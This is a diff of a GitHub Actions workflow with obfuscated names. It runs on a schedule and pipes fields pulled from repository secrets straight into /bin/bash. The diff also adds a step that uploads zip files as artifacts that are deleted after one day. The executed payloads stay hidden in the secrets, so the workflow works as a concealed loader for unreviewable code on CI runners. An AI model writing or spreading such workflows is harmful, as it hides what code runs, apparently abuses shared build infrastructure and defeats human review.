@@ -1,29 +1,24 @@
 name: qunzhengxialu
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '31 2/6 * * *'
 
-jobs:  # 14108
+  schedule:
+    - cron: '53 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: qunzhengxialu
         env:
-          vn614: ${{ secrets.vn614 }}
+          b3: ${{ secrets.b3 }}
         run: |
-          echo $vn614 | jq -r .nxavy7 | /bin/bash
-          echo $m48 | jq -r .fwwee1 | /bin/bash
-          echo $e095 | jq -r .srv99178 | /bin/bash
-          echo $mrtt3928 | jq -r .rtunu76052 | /bin/bash
-          echo $anbzu56 | jq -r .zux0211 | /bin/bash
-          echo $j2 | jq -r .l02 | /bin/bash
-          echo $mbf065 | jq -r .ir02 | /bin/bash
-          echo $isik909 | jq -r .fgx793 | /bin/bash
-          echo $krs8293 | jq -r .rtg579 | /bin/bash
-          echo $rhd347 | jq -r .ykv0 | /bin/bash
-          echo $fgy17 | jq -r .s13381 | /bin/bash
-          echo $xvrqk406 | jq -r .rhif63 | /bin/bash
-          echo $q1 | jq -r .zuac299 | /bin/bash
+          printf '%s' "$b3" | jq -r .irdu85921 | /bin/bash
+          echo $fy1473 | jq -r .zr1 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: j60OSIuh
+          path: "*.zip"
+          retention-days: 1
